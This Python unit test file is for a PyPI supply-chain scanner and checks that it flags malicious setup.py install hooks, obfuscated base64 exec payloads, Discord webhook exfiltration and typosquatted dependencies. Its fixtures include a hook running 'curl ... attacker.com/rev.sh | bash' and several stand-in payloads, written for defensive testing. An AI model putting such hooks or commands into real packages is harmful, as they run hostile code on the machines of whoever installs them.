"""Unit tests for PyPI Supply-Chain Security & Malicious setup.py Analyzer."""

import os
import tempfile
import unittest

from python_hunter.application.orchestrator.scan_orchestrator import ScanOrchestrator
from python_hunter.domain.dependencies.pypi_supply_chain import PyPISupplyChainAnalyzer


class TestPyPISupplyChainAnalyzer(unittest.TestCase):
    """Test suite for setup.py malware, obfuscation, exfiltration, and typosquatting detection."""

    def setUp(self) -> None:
        self.analyzer = PyPISupplyChainAnalyzer()

    def test_benign_setup_py_produces_no_findings(self) -> None:
        """Verify standard setup.py without malicious patterns reports zero findings."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "from setuptools import setup, find_packages\n\n"
                    "setup(\n"
                    "    name='benign-package',\n"
                    "    version='1.0.0',\n"
                    "    packages=find_packages(),\n"
                    "    install_requires=['flask>=2.0.0'],\n"
                    ")\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertEqual(len(findings), 0)

    def test_custom_install_cmdclass_hook_detection(self) -> None:
        """Verify detection of custom install classes executing dangerous operations."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "import os\n"
                    "from setuptools import setup\n"
                    "from setuptools.command.install import install\n\n"
                    "class PostInstallCommand(install):\n"
                    "    def run(self):\n"
                    "        install.run(self)\n"
                    "        os.system('curl -s http://attacker.com/rev.sh | bash')\n\n"
                    "setup(\n"
                    "    name='malicious-pkg',\n"
                    "    version='0.1.0',\n"
                    "    cmdclass={'install': PostInstallCommand},\n"
                    ")\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertTrue(any(f.rule_id == "PYHUNTER-PYPI-SETUP-001" for f in findings))
            hook_finding = next(f for f in findings if f.rule_id == "PYHUNTER-PYPI-SETUP-001")
            self.assertIn("PostInstallCommand.run", hook_finding.title)

    def test_top_level_dangerous_execution_in_setup_py(self) -> None:
        """Verify detection of top-level os.system / subprocess calls in setup.py."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "import subprocess\n"
                    "from setuptools import setup\n\n"
                    "subprocess.run(['bash', '-c', 'whoami'])\n\n"
                    "setup(name='trojan-pkg', version='1.0.0')\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertTrue(any(f.rule_id == "PYHUNTER-PYPI-SETUP-001" for f in findings))
            self.assertTrue(any("subprocess.run" in f.evidence for f in findings))

    def test_obfuscated_base64_payload_detection(self) -> None:
        """Verify detection of base64 decoded exec/eval payloads in setup.py."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "import base64\n"
                    "from setuptools import setup\n\n"
                    "exec(base64.b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oIndob2FtaSIp'))\n\n"
                    "setup(name='hidden-pkg', version='1.0')\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertTrue(any(f.rule_id == "PYHUNTER-PYPI-OBFUSC-001" for f in findings))

    def test_discord_webhook_exfiltration_endpoint(self) -> None:
        """Verify detection of Discord webhook exfiltration endpoints."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "import urllib.request\n"
                    "from setuptools import setup\n\n"
                    "WEBHOOK = 'https://discord.com/api/webhooks/123456789/abcdef'\n"
                    "urllib.request.urlopen(WEBHOOK)\n\n"
                    "setup(name='exfil-pkg', version='1.0')\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertTrue(any(f.rule_id == "PYHUNTER-PYPI-EXFIL-001" for f in findings))

    def test_typosquatting_detection_in_requirements_txt(self) -> None:
        """Verify detection of typosquatted packages in requirements.txt."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            req_path = os.path.join(tmp_dir, "requirements.txt")
            with open(req_path, "w", encoding="utf-8") as f:
                f.write(
                    "reqeusts==2.28.1\n"
                    "colorma>=0.4.0\n"
                    "fastapi==0.95.0\n"  # legitimate
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            typo_findings = [f for f in findings if f.rule_id == "PYHUNTER-PYPI-TYPO-001"]
            self.assertGreaterEqual(len(typo_findings), 2)
            titles = [f.title for f in typo_findings]
            self.assertTrue(any("reqeusts" in t for t in titles))
            self.assertTrue(any("colorma" in t for t in titles))

    def test_typosquatting_detection_in_pyproject_toml(self) -> None:
        """Verify detection of typosquatted packages in pyproject.toml."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            pyproj_path = os.path.join(tmp_dir, "pyproject.toml")
            with open(pyproj_path, "w", encoding="utf-8") as f:
                f.write(
                    "[project]\n"
                    "name = 'sample-app'\n"
                    "dependencies = [\n"
                    "    'djanjo>=4.2',\n"
                    "    'pydanticc>=2.0',\n"
                    "]\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            typo_findings = [f for f in findings if f.rule_id == "PYHUNTER-PYPI-TYPO-001"]
            self.assertGreaterEqual(len(typo_findings), 2)
            evidences = [f.evidence for f in typo_findings]
            self.assertTrue(any("djanjo" in e for e in evidences))
            self.assertTrue(any("pydanticc" in e for e in evidences))

    def test_package_init_dropper_detection(self) -> None:
        """Verify detection of obfuscated exec payload in __init__.py."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            pkg_dir = os.path.join(tmp_dir, "mypkg")
            os.makedirs(pkg_dir)
            init_path = os.path.join(pkg_dir, "__init__.py")
            with open(init_path, "w", encoding="utf-8") as f:
                f.write(
                    "import base64\n"
                    "eval(base64.b64decode('cHJpbnQoImhpZGRlbiIp'))\n"
                )

            findings = self.analyzer.analyze_workspace(tmp_dir)
            self.assertTrue(any(f.rule_id == "PYHUNTER-PYPI-OBFUSC-001" for f in findings))

    def test_orchestrator_integration_with_pypi_malware(self) -> None:
        """Verify ScanOrchestrator detects PyPI malware and enforces policy exit code 1."""
        with tempfile.TemporaryDirectory() as tmp_dir:
            setup_path = os.path.join(tmp_dir, "setup.py")
            with open(setup_path, "w", encoding="utf-8") as f:
                f.write(
                    "import os\n"
                    "os.system('id')\n"
                    "from setuptools import setup\n"
                    "setup(name='bad-pkg', version='1.0')\n"
                )

            orchestrator = ScanOrchestrator()
            result = orchestrator.run_scan(tmp_dir)

            self.assertIsNotNone(result)
            self.assertGreaterEqual(len(result.findings), 1)
            self.assertEqual(result.exit_code, 1)
            self.assertGreaterEqual(result.project_risk.overall_score, 90.0)


if __name__ == "__main__":
    unittest.main()
